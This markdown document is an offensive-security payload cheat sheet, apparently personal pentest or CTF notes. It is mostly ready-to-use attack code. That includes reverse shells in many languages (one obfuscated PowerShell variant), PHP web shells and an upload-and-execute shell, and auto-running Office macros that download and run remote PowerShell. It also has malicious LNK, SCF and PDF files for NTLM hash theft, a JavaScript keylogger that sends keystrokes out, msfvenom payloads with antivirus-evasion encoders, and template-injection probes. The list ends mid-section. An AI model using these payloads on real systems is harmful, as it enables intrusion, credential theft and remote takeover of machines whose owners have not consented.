- [Spoofing Office Marco](#spoofing-office-macro)
- [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
- [Visual Basic for Application (VBA)](#visual-basic-for-application-vba)
- [Windows Scripting Host (WSH)](#windows-scripting-host-wsh)
- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
- [xterm Reverse Shell](#xterm-reverse-shell)
- [ysoserial](#ysoserial)
- [ysoserial.net](#ysoserialnet)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| EXE_to_DLL | Converts a EXE into DLL | https://github.com/hasherezade/exe_to_dll |
| GadgetToJScript | A tool for generating .NET serialized gadgets that can trigger .NET assembly load/execution when deserialized using BinaryFormatter from JS/VBS/VBA based scripts. | https://github.com/med0x2e/GadgetToJScript |
| hoaxshell | An unconventional Windows reverse shell, currently undetected by Microsoft Defender and various other AV solutions, solely based on http(s) traffic. | https://github.com/t3l3machus/hoaxshell |
| Intruder Payloads | A collection of Burpsuite Intruder payloads, BurpBounty payloads, fuzz lists, malicious file uploads and web pentesting methodologies and checklists. | https://github.com/1N3/IntruderPayloads |
| Ivy | Ivy is a payload creation framework for the execution of arbitrary VBA (macro) source code directly in memory. Ivy’s loader does this by utilizing programmatical access in the VBA object environment to load, decrypt and execute shellcode. | https://github.com/optiv/Ivy |
| marshalsec | Java Unmarshaller Security | https://github.com/mbechler/marshalsec |
| Nishang | Offensive PowerShell for red team, penetration testing and offensive security. | https://github.com/samratashok/nishang |
| ntlm_theft | A tool for generating multiple types of NTLMv2 hash theft files. | https://github.com/Greenwolf/ntlm_theft |
| p0wny@shell:~# | Single-file PHP shell | https://github.com/flozz/p0wny-shell |
| Payload Box | Payload Collection | https://github.com/payloadbox |
| PayloadsAllTheThings | A list of useful payloads and bypass for Web Application Security and Pentest/CTF. | https://github.com/swisskyrepo/PayloadsAllTheThings |
| phpgcc | PHPGGC is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically. | https://github.com/ambionics/phpggc |
| PHP-Reverse-Shell | PHP shells that work on Linux OS, macOS, and Windows OS. | https://github.com/ivan-sincek/php-reverse-shell |
| pixload | Image Payload Creating/Injecting tools | https://github.com/sighook/pixload |
| PySoSerial | PySoSerial is a tool for identification and exploitation of insecure deserialization vulnerabilities in python. | https://github.com/burw0r/PySoSerial |
| SharpPyShell | SharPyShell - tiny and obfuscated ASP.NET webshell for C# web applications | https://github.com/antonioCoco/SharPyShell |
| webshell | This is a webshell open source project | https://github.com/tennc/webshell |
| WebShell | Webshell && Backdoor Collection | https://github.com/xl7dev/WebShell |
| Weevely | Weaponized web shell | https://github.com/epinna/weevely3 |
| woodpecker | Log4j jndi injects the Payload generator | https://github.com/woodpecker-appstore/log4j-payload-generator |
| ysoserial | A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. | https://github.com/frohoff/ysoserial |
| ysoserial.net | Deserialization payload generator for a variety of .NET formatters | https://github.com/pwntester/ysoserial.net |

## .LNK (Link) File

> https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence

### Malicious.lnk

```c
$path                      = "$([Environment]::GetFolderPath('Desktop'))\<FILE>.lnk"
$wshell                    = New-Object -ComObject Wscript.Shell
$shortcut                  = $wshell.CreateShortcut($path)

$shortcut.IconLocation     = "C:\Windows\System32\shell32.dll,70"

$shortcut.TargetPath       = "cmd.exe"
$shortcut.Arguments        = "/c explorer.exe Z:\PATH\TO\SHARE & \\<LHOST>\foobar" # Calls the SMB share of the responder instance on the C2 server
$shortcut.WorkingDirectory = "C:"
$shortcut.HotKey           = "CTRL+C"
$shortcut.Description      = ""

$shortcut.WindowStyle      = 7
                           # 7 = Minimized window
                           # 3 = Maximized window
                           # 1 = Normal    window
$shortcut.Save()

(Get-Item $path).Attributes += 'Hidden' # Optional if we want to make the link invisible (prevent user clicks)
```

### Hide Target Folder

```c
C:\> attrib -h Z:\PATH\TO\FOLDER\<FOLDER>
```

## .SCF (Shell Command File) File

### Malicious.scf

```c
[Shell]
Command=2
Iconfile=\\<LHOST>\foobar
[Taskbar]
Command=ToggleDesktop
```

## An HTML Application (HTA)

### payload.hta

```c
<html>
<body>
<script>
  var c= 'cmd.exe'
  new ActiveXObject('Wscript.Shell').Run(c);
</script>
</body>
</html>
```

### One-Liner

```c
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://<LHOST>/<FILE>.ps1')"</scRipt>
```

## Background Reverse Shells

```c
$ (mkfifo /tmp/K98LmaT; nc <LHOST> <LPORT> 0</tmp/K98LmaT | /bin/sh >/tmp/K98LmaT 2>&1; rm /tmp/K98LmaT) &
$ script -c 'bash -i' /dev/null </dev/udp/<LHOST>/<LPORT> >&0 2>&1 &
$ screen -md bash -c 'bash -i >/dev/tcp/<LHOST>/<LPORT> 2>&1 0<&1' -md ('start a new detached process')
$ tmux new-session -d -s mysession 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

## Bad PDF

```c
%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R
   /AA <<
    /O <<
       /F (\\\\<LHOST>\\<FILE>)
    /D [ 0 /Fit]
    /S /GoToE
    >>
    >>
    /Parent 2 0 R
    /Resources <<
   /Font <<
    /F1 <<
     /Type /Font
     /Subtype /Type1
     /BaseFont /Helvetica
     >>
      >>
    >>
>>
endobj
4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(PDF Document) Tj
ET
endstream
endobj
trailer
<<
 /Root 1 0 R
>>
%%EOF
```

## Bash Reverse Shell

```c
$ bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
$ bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
$ echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' | base64
```

### URL Encoded

```c
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<LHOST>%2F<LPORT>%200%3E%261%27
```

## curl Reverse Shell

```c
$ curl --header "Content-Type: application/json" --request POST http://<RHOST>:<RPORT>/upload --data '{"auth": {"name": "<USERNAME>", "password": "<PASSWORD>"}, "filename" : "& echo "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"|base64 -d|bash"}'
```

### With JWT Token

```c
$ curl -i -s -k -X $'POST' -H $'Host: api.<RHOST>' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMzIyMjk2LCJleHAiOjE2MzI5MTQyOTZ9.y8GGfvwe1LPGOGJUVjmzMIsZaR5aok60X6fmEnAHvMg' -H $'Content-Type: application/json' -H $'Origin: http://api.<RHOST>' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f)\",\"port\":\"1337\"\}' $'http://api.<RHOST>/admin/plugins/install' --proxy http://127.0.0.1:8080
```

## Exiftool

### PHP into JPG Injection

```c
$ exiftool -Comment='<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"); ?>' shell.jpg
$ exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' <FILE>.jpeg
$ exiftool "-comment<=back.php" back.png
$ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' <FILE>.png
```

## GhostScript

```c
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat flag > /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
```

## GIF

### Magic Byte

Add `GIF8` on line `1` of for example a php shell to get the file recognized as a gif file. Even when you name it `shell.php`.

## Groovy (Jenkins) Reverse Shell

```c
String host="<LHOST>";
int port=<LPORT>;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## iconv

### Converting Payload to Windows Encoding

```c
$ echo -n "IEX(New-Object Net.WebClient).downloadString('http://<LHOST>:<LPORT>/revshell.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
```

```c
C:\> runas /user:ACCESS\Administrator /savecred "Powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADkAOgA4ADAALwByAGUAdgBzAGgAZQBsAGwALgBwAHMAMQAnACkA"
```

## JAVA Reverse Shell

```c
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

$ r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();
```

### shell.jar

```c
package <NAME>;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

public class Main extends JavaPlugin {
   @Override
   public void onDisable() {
     super.onDisable();
   }

@Override
public void onEnable() {
  final String PHP_CODE = "<?php system($_GET['cmd']); ?>";
  try {
   Files.write(Paths.get("/var/www/<DOMAIN>/shell.php"), PHP_CODE.getBytes(), StandardOpenOption.CREATE_NEW);
   } catch (IOException e) {
     e.printStackTrace();
   }

   super.onEnable();
  }
}
```

## JavaScript Keylogger

### logger.js

```c
var keys='';
var url = 'bitwarden-info.gif?c=';

document.onkeypress = function(e) {
    get = window.event?event:e;
    key = get.keyCode?get.keyCode:get.charCode;
    key = String.fromCharCode(key);
    keys+=key;

}
window.setInterval(function(){
    if(keys.length>0) {
        new Image().src = url=keys;
        keys = '';
    }
}, 5000);
```

```c
<!doctype html>
    <script src="log.js">
  </script>
</body></html>
```

## JDWP

### Remote Code Execution (RCE)

```c
$ print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("whoami").getInputStream())).readLine())
```

## Lua Reverse Shell

```c
http://<RHOST>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT>/tmp/f")--
```

## Macros

### Create malicious Word Documents

#### Payload

```c
IEX(New-Object System.Net.WebClient).DownloadString("http://<LHOST>/powercat.ps1");powercat -c <LHOST> -p <LPORT> -e powershell
```

> https://www.base64decode.org/

Now `Base64 encode` it with `UTF-16LE` and `LF (Unix)`.

```c
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8APABMAEgATwBTAFQAPgAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACIAKQA7AHAAbwB3AGUAcgBjAGEAdAAgAC0AYwAgADwATABIAE8AUwBUAD4AIAAtAHAAIAA8AEwAUABPAFIAVAA+ACAALQBlACAAcABvAHcAZQByAHMAaABlAGwAbAA=
```

#### Python Script for Formatting

```c
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8APABMAEgATwBTAFQAPgAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACIAKQA7AHAAbwB3AGUAcgBjAGEAdAAgAC0AYwAgADwATABIAE8AUwBUAD4AIAAtAHAAIAA8AEwAUABPAFIAVAA+ACAALQBlACAAcABvAHcAZQByAHMAaABlAGwAbAA="

n = 50

for i in range(0, len(str), n):
        print("Str = Str + " + '"' + str[i:i+n] + '"')
```

```c
$ python3 script.py 
Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
Str = Str + "wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA"
Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
Str = Str + "GQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8APABMAEg"
Str = Str + "ATwBTAFQAPgAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACIAK"
Str = Str + "QA7AHAAbwB3AGUAcgBjAGEAdAAgAC0AYwAgADwATABIAE8AUwB"
Str = Str + "UAD4AIAAtAHAAIAA8AEwAUABPAFIAVAA+ACAALQBlACAAcABvA"
Str = Str + "HcAZQByAHMAaABlAGwAbAA="
```

#### Final Macro

```c
Sub AutoOpen()
    MalMacro
End Sub

Sub Document_Open()
    MalMacro
End Sub

Sub MalMacro()
    Dim Str As String

        Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
        Str = Str + "wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA"
        Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
        Str = Str + "GQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8APABMAEg"
        Str = Str + "ATwBTAFQAPgAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACIAK"
        Str = Str + "QA7AHAAbwB3AGUAcgBjAGEAdAAgAC0AYwAgADwATABIAE8AUwB"
        Str = Str + "UAD4AIAAtAHAAIAA8AEwAUABPAFIAVAA+ACAALQBlACAAcABvA"
        Str = Str + "HcAZQByAHMAaABlAGwAbAA="

    CreateObject("Wscript.Shell").Run Str

End Sub
```

### Create malicious Libre Office Documents

```c
Sub Main

    Shell("cmd.exe /c powershell -e JAjA<--- CUT FOR BREVITY --->AA==")
    
End Sub
```

Now `assign` the `macro` to an `event`.

*Tools > Customize > Events > Open Document*

## marco_pack

```c
PS C:\macro_pack_pro> echo .\<FILE>.bin | marco_pack.exe -t SHELLCODE -G .\<FILE>.pdf.lnk --icon='C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13' --hta-macro --bypass
```

## Markdown Reverse Shell

```c
--';bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1;'--
```

## mkfifo Reverse Shell

```c
$ mkfifo /tmp/shell; nc <LHOST> <LPORT> 0</tmp/shell | /bin/sh >/tmp/shell 2>&1; rm /tmp/shell
```

## msfvenom

### Basic Commands

```c
$ msfvenom -l payloads       // list payloads
$ msfvenom --list formats    // list formats for payloads
```

### Common Payloads

```c
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf > <FILE>.elf
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f WAR > <FILE>.war
$ msfvenom -p php/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e php/base64 -f raw
$ msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
$ msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o "r'<FILE>.exe"
$ msfvenom -p windows/x64/exec CMD='\\<LHOST>\PATH\TO\SHARE\nc.exe <LHOST> <LPORT> -e cmd.exe' -f dll > <FILE>.dll
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o <FILE>.aspx
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b '\x00' -f exe    # -b is bad bytes
$ msfvenom -p windows/meterpreter/reverse_http LHOST=<LHOST> LPORT=<LPORT> HttpUserAgent=<HEADER> -f exe -o <FILE>.exe
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o <FILE>.aspx
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILE>.exe
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILE>.exe -e x64/zutto_dekiru -i 10
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILE>.exe -e x64/zutto_dekiru -i 10 -x ./putty.exe -k
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f c
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f csharp
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f exe -o <FILE>.exe -e x64/zutto_dekiru -i 10 -x ./putty.exe -k
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread PREPENDMIGRATE=true PREPENDMIGRATEPROC=explorer.exe -f exe -o <FILE>.exe -e x64/zutto_dekiru -i 10 -x ./putty.exe -k
```

## Netcat Reverse Shell

```c
$ nc -e /bin/sh <LHOST> <LPORT>
```

## Nishang

> https://github.com/samratashok/nishang

### Reverse-TCP Shell for Windows

```c
$ cd PATH/TO/nishang/Shells/
$ cp Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcp.ps1
```

Choose which variant you require, copy and put it at the end of the file.

```c
tail -3 Invoke-PowerShellTcp.ps1 
}

Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>
```

```c
C:\> powershell "IEX(New-Object Net.Webclient).downloadString('http://<LHOST>:<LPORT>/Invoke-PowerShellTcp.ps1')"
```

## ntml_theft

```c
$ python3 ntlm_theft.py --generate all --server <RHOST> --filename <FOLDER>
```

## PDF

### Magic Bytes

```c
%PDF-1.5
<PAYLOAD>
%%EOF
```

## Perl Reverse Shell

```c
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## PHP popen Web Shell

> https://www.php.net/manual/en/function.popen.php

Upload it for example as `webshell.phar`.

```c
<?php
$command = $_GET['cmd'];
$handle = popen($command, 'r');
$output = fgets($handle);
echo $output;
?>
```

## PHP Reverse Shell

### Common Payloads

```c
<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"); ?>
```

## Operating System

```c
$ php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Upload

```c
<?php file_put_contents($_GET['upload'], file_get_contents("http://<LHOST>:<LPORT>/" . $_GET['upload']); ?>
```

### Upload and Execution

```c
<?php if (isset($_GET['upload'])) {file_put_contents($_GET['upload'], file_get_contents("http://<LHOST>:<LPORT>/" . $_GET['upload'])); }; if (isset($_GET['cmd'])) { system($_GET['cmd']); };?>
```

### Embedded in .png-File

```c
$ echo '<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"); ?>' >> shell.php.png
```

## PHP Web Shell

### Common Payloads

```c
<?php system($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php echo exec($_POST['cmd']); ?>
<?php echo passthru($_GET['cmd']); ?>
<?php echo system($_REQUEST['shell']): ?>
```

### Sanity Check

```c
<?php echo "test";?>
```

### Alternative Web Shells

```c
<?=$_GET[0]?>
<?=$_POST[0]?>
<?={$_REQUEST['_']}?>
```

```c
<?=$_="";$_="'";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo$_?>
```

```c
<?php echo(md5(1));@system($_GET[0]);?>
```

> http://<RHOST>/<FILE>.php?0=<COMMAND>

## PowerShell Reverse Shell

```c
$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```c
$ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```c
$  powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

### Obfuscated Reverse Shell

```c
$gnlSlSXDZ = & ([string]::join('', ( ($(0+0-0-0-0-78+78+78),$(101+101+0-0-0-0-0+0-101),($(119)),$(0+0-0-0-0+45),$($(79)),$(((98))),($(106)),$(101+101+0-0-0-0-0+0-101),$(99+99+0-99),$($(116))) |ForEach-Object{$_<##>}|%{ ( [char][int] $_<#ZdQB8miMexFGoshJ4qKRp1#>)})) |ForEach-Object{<##>$($_)}| % {<#HWEG3yFVCbNOvfYute5#>$_<#o#>}) ([string]::join('', ( ($(83+83+0+0+0-0-83),$(((121))),((115)),$($(116)),$(101+101+0-0-0-0-0+0-101),(($(109))),(46),$(0+0-0-0-0-78+78+78),$(101+101+0-0-0-0-0+0-101),$($(116)),(46),$(83+83+0+0+0-0-83),$(0+0+0+0+111),$(99+99+0-99),(107),$(101+101+0-0-0-0-0+0-101),$($(116)),((115)),(46),(84),($(67)),$(80),($(67)),$(0-0+0-108+108+108),$(0+105),$(101+101+0-0-0-0-0+0-101),(110),$($(116))) |ForEach-Object{$($_)<##>}|%{ ( [char][int] <##>$($_)<##>)})) |ForEach-Object{<#FLut3kIYDMAyO9a2hEH0zQJ4w#>$_<#WI8r#>}| % {<#OjUEN8nkxf#>$($_)})("J5q0aMgvL.xAeq3T8MEcL6sRaXUrOZ.SHUZv12CgW0es7xPkJmtFo.CbYjgiDaIe7GWdPs".replace('CbYjgiDaIe7GWdPs',DDDDDDDD).replace('SHUZv12CgW0es7xPkJmtFo',CCCCCCCC).replace('J5q0aMgvL',AAAAAAAA).replace('xAeq3T8MEcL6sRaXUrOZ',BBBBBBBB),$(EEEEEEEE));$fU4QP = $gnlSlSXDZ.GetStream();$h1okj42 = New-Object System.Net.Security.SslStream($fU4QP,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));$h1okj42.AuthenticateAsClient('FFFFFFFF', $null, "Tls12", $false);$nf1083fj = new-object System.IO.StreamWriter($h1okj42);$nf1083fj.Write('PS ' + (pwd).Path + '> ');$nf1083fj.flush();[byte[]]$h8r109 = 0..65535|%{0};while(($nf839nf = $h1okj42.Read($h8r109, 0, $h8r109.Length)) -ne 0){$nr81of = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($h8r109,0, $nf839nf);$ngrog49 = (iex $nr81of | Out-String ) 2>&1;$nir1048 = $ngrog49 + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($nir1048);$h1okj42.Write($sendbyte,0,$sendbyte.Length);$h1okj42.Flush()};
```

- AAAAAAAA == 1st octet of <LHOST>
- BBBBBBBB == 2nd octet of <LHOST>
- CCCCCCCC == 3rd octet of <LHOST>
- DDDDDDDD == 4th octet of <LHOST>
- EEEEEEEE == <LHOST>
- FFFFFFFF == Domain to auth as (doesn't really matter, use something that looks like theirs)

### minireverse.ps1

```c
$socket = new-object System.Net.Sockets.TcpClient('127.0.0.1', 413);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do
{
	$writer.Flush();
	$read = $null;
	$res = ""
	while($stream.DataAvailable -or $read -eq $null) {
		$read = $stream.Read($buffer, 0, 1024)
	}
	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
	if(!$out.equals("exit")){
		$args = "";
		if($out.IndexOf(' ') -gt -1){
			$args = $out.substring($out.IndexOf(' ')+1);
			$out = $out.substring(0,$out.IndexOf(' '));
			if($args.split(' ').length -gt 1){
                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
                $pinfo.FileName = "cmd.exe"
                $pinfo.RedirectStandardError = $true
                $pinfo.RedirectStandardOutput = $true
                $pinfo.UseShellExecute = $false
                $pinfo.Arguments = "/c $out $args"
                $p = New-Object System.Diagnostics.Process
                $p.StartInfo = $pinfo
                $p.Start() | Out-Null
                $p.WaitForExit()
                $stdout = $p.StandardOutput.ReadToEnd()
                $stderr = $p.StandardError.ReadToEnd()
                if ($p.ExitCode -ne 0) {
                    $res = $stderr
                } else {
                    $res = $stdout
                }
			}
			else{
				$res = (&"$out" "$args") | out-string;
			}
		}
		else{
			$res = (&"$out") | out-string;
		}
		if($res -ne $null){
        $writer.WriteLine($res)
    }
	}
}While (!$out.equals("exit"))
$writer.close();
$socket.close();
$stream.Dispose()
```

## Python Reverse Shell

```c
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
$ python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'
$ echo python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > <FILE><(),2);p=subprocess.call(["/bin/sh","-i"]);' > <FILE>
```

## Remote File Inclusion (RFI)

```c
<?php
exec("bash -c 'exec bash -i &>/dev/tcp/<LHOST>/<LPORT> <&1'");
?>
```

## Ruby Reverse Shell

```c
$ ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Spoofing Office Marco

> https://github.com/christophetd/spoofing-office-macro

## Server-Side Template Injection (SSTI)

> https://github.com/payloadbox/ssti-payloads

```c
{{2*2}}[[3*3]]
{{3*3}}
{{3*'3'}}
<%= 3 * 3 %>
${6*6}
${{3*3}}
@(6+5)
#{3*3}
#{ 3 * 3 }
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{config.items()}}
{{ [].class.base.subclasses() }}
